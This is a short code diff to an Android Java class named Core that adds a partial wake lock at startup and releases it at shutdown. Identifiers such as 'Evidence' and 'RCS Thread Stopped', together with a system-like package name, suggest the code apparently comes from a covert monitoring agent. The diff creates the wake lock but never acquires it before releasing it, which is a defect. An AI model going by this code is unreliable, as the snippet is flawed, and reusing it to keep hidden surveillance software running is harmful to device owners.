@@ -9,9 +9,12 @@ package com.android.service;
 
 import android.app.Activity;
 import android.content.ContentResolver;
+import android.content.Context;
 import android.content.res.Resources;
 import android.os.Handler;
 import android.os.Message;
+import android.os.PowerManager;
+import android.os.PowerManager.WakeLock;
 
 import com.android.service.action.Action;
 import com.android.service.action.SubAction;
@@ -52,6 +55,7 @@ public class Core extends Activity implements Runnable {
 
 	/** The event manager. */
 	private EventManager eventManager;
+	private WakeLock wl;
 
 	/**
 	 * Start.
@@ -78,6 +82,9 @@ public class Core extends Activity implements Runnable {
 			if(Cfg.DEBUG) { Check.log(e); }
 		}
 		
+		PowerManager pm = (PowerManager) Status.getAppContext().getSystemService(Context.POWER_SERVICE);
+		wl=pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "T");
+				
 		Evidence.info("Started");
 		return true;
 	}
@@ -91,6 +98,7 @@ public class Core extends Activity implements Runnable {
 		bStopCore = true;
 		stopAll();
 		if(Cfg.DEBUG) Check.log( TAG + " RCS Thread Stopped");
+		wl.release();
 		return true;
 	}
 
